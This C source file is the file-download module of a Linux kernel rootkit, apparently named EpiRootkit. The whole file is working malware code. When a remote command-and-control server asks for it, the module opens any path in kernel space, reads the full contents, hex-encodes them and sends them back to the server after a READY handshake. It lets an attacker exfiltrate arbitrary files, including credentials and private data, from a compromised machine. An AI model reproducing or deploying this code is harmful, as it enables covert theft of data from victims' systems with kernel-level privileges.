#include "download.h"
#include "epirootkit.h"
#include "io.h"
#include "network.h"

static bool sending_file = false;
static char *download_buffer = NULL;
static long download_size = 0;

bool is_downloading(void) {
    return sending_file;
}

void reset_download_state(void) {
    DBG_MSG("reset_download_state: cleaning up memory\n");
    if (download_buffer)
        vfree(download_buffer);
    download_buffer = NULL;
    download_size = 0;
    sending_file = false;
}

int download_handler(char *args, enum Protocol protocol) {
    if (protocol != TCP) {
        DBG_MSG("download_handler: warning, protocol is not TCP\n");
    }

    if (!args || !*args) {
        DBG_MSG("download_handler: missing file path argument\n");
        send_to_server(protocol, "Usage: download <path>\n");
        return -EINVAL;
    }

    DBG_MSG("download_handler: attempting to open file: %s\n", args);
    struct file *filp = filp_open(args, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        ERR_MSG("download_handler: failed to open file %s\n", args);
        send_to_server(protocol, "Failed to open file.\n");
        return PTR_ERR(filp);
    }

    loff_t pos = 0;
    int size = i_size_read(file_inode(filp));
    DBG_MSG("download_handler: file size is %d\n", size);

    if (size <= 0) {
        filp_close(filp, NULL);
        DBG_MSG("download_handler: file is empty or unreadable\n");
        send_to_server(protocol, "File is empty or unreadable.\n");
        return -EINVAL;
    }
    
    char *buffer = vmalloc(size);
    if (!buffer) {
        filp_close(filp, NULL);
        ERR_MSG("download_handler: memory allocation failed\n");
        send_to_server(protocol, "Insufficient memory.\n");
        return -ENOMEM;
    }

    int read_bytes = kernel_read(filp, buffer, size, &pos);
    filp_close(filp, NULL);

    if (read_bytes != size) {
        ERR_MSG("download_handler: read error (%d / %d)\n", read_bytes, size);
        vfree(buffer);
        send_to_server(protocol, "Error reading file.\n");
        return -EIO;
    }

    download_buffer = buffer;
    download_size = size;
    sending_file = true;

    DBG_MSG("download_handler: file read successfully (%d bytes)\n", size);

    char size_msg[64];
    snprintf(size_msg, sizeof(size_msg), "SIZE %ld\n", download_size);
    send_to_server(protocol, size_msg);

    DBG_MSG("download_handler: waiting for READY before sending file\n");
    return 0;
}

int download(const char *command) {
    if (sending_file && strncmp(command, "READY", 5) == 0) {
        DBG_MSG("download: received READY, starting file transfer (%ld bytes)\n", download_size);

        // Hexify download buffer
        long hex_size = download_size * 2;
        char *hex_buffer = vmalloc(hex_size + 1);
        if (!hex_buffer) {
            ERR_MSG("download: failed to allocate hex buffer\n");
            reset_download_state();
            return -ENOMEM;
        }

        for (long i = 0; i < download_size; ++i) {
            snprintf(hex_buffer + (i * 2), 3, "%02x", (unsigned char) download_buffer[i]);
        }

        int ret = send_to_server_raw(hex_buffer, hex_size);
        if (ret < 0) {
            ERR_MSG("download: failed to send file\n");
        }

        vfree(hex_buffer);
        reset_download_state();
        return 0;

    }

    DBG_MSG("download: command ignored or not in transfer mode\n");
    return -1;
}
